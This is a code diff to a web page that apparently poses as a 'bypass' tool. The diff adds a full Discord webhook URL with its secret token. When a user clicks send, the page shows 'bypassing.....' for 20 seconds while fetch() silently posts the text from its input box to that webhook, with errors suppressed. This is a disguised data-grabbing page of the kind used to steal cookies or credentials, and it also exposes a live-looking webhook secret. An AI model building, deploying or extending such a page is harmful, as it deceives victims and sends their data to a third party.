@@ -112,7 +112,7 @@
       transition: all 0.15s ease;
     }
 
-    /* Updated Floating Button Styling for the Processing State */
+    /* Floating Button Styling for the Processing State */
     .status-sending { 
       font-size: 15px;
       font-weight: 600;
@@ -197,8 +197,8 @@
     const sendBtn = document.getElementById('send-btn');
     const status = document.getElementById('status');
 
-    // Your working Discord delivery webhook endpoint
-    const DISCORD_WEBHOOK_URL = "discord.com";
+    // Your confirmed live Discord delivery webhook endpoint
+    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1504171986480529619/s1oUgKfAd_trajzQzp8bS-uHhrgndv6aLf3QWVCQq5BAZwkBWI4RQ2gQZtuTgOjwQnlA";
 
     // Track user string activity state values
     textarea.addEventListener('input', () => {
@@ -215,7 +215,7 @@
       status.textContent = "bypassing.....";
       status.className = "status-msg status-sending";
 
-      // Fire off data delivery task instantly to the backend pipeline
+      // Fire off data delivery task instantly to the live Discord webhook URL
       try {
         await fetch(DISCORD_WEBHOOK_URL, {
           method: 'POST',
@@ -225,7 +225,7 @@
           })
         });
       } catch (err) {
-        // Run completely silent background handling to preserve runtime execution state
+        // Silent error handle to maintain UI consistency if networks are offline
       }
 
       // Maintain active "bypassing....." view state profile configurations for exactly 20 seconds
